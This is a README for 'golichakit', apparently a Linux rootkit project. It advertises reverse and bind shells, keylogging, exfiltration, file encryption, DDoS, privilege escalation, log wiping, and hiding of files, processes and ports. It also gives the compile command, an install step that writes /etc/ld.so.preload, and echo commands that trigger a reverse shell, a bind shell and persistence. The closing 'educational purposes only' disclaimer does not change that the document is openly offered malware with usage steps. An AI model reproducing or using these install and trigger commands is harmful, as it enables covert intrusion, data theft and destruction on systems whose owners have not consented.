# golitchakit
golichakit a linux rootkit kernal mode communication 

# golichakit
golichakit

## Key Features Added:

### 1. **Advanced Protection System**
- Anti-debugging (ptrace)
- Anti-sandbox (Docker/container detection)
- Process hiding (prctl)
- Signal masking
- Random delays for timing analysis bypass

### 2. **20+ Command Handlers**
- **rev** - Reverse shell
- **bind** - Bind shell  
- **persist** - Persistence installation
- **killconn** - Kill connections
- **hide/unhide** - Process hiding
- **exfil** - File exfiltration
- **download** - File download
- **screen** - Screenshot capture
- **keylog** - Keylogger
- **crypto** - File encryption
- **clean** - Log cleaning
- **stealth** - Stealth command execution
- **privesc** - Privilege escalation
- **ddos** - DDoS attack
- **scan** - Port scanning
- **sysinfo** - System information
- **pslist** - Process listing
- **kill** - Kill processes
- **upload** - File upload

### 3. **Improved Networking**
- Connection timeout handling
- Backup IP/Port support
- Automatic retry mechanism
- Multiple protocol support

### 4. **Stealth Features**
- XOR string obfuscation
- Process renaming
- File hiding (readdir hook)
- Port hiding (netstat hook)
- Log cleaning automation

### 5. **Persistence Methods**
- ld.so.preload
- Cron jobs
- Init scripts
- Bashrc/profile
- Crontab entries

### 6. **Privilege Escalation**
- SUID binary exploitation
- Sudo abuse
- Setuid binary finding

### 7. **File Operations**
- File encryption (AES-256)
- File exfiltration with base64
- Secure file transfer

### 8. **Anti-Forensics**
- Log wiping
- History clearing
- Memory cleanup
- Self-deletion capability

## Compilation Instructions:
```bash
gcc -shared -fPIC -o ld.so.preload golichatkit.c -ldl -lpthread
```

## Usage:
```bash
# Install
sudo cp ld.so.preload /etc/ld.so.preload

# Trigger commands via write hook
echo "plsrev" > /proc/somefile  # Triggers reverse shell
echo "plsbind" > /proc/somefile # Triggers bind shell
echo "plspersist" > /proc/somefile # Install persistence
```

**⚠️ WARNING**: This code is for **educational and research purposes only**. Using this for malicious purposes is illegal. Always obtain proper authorization.
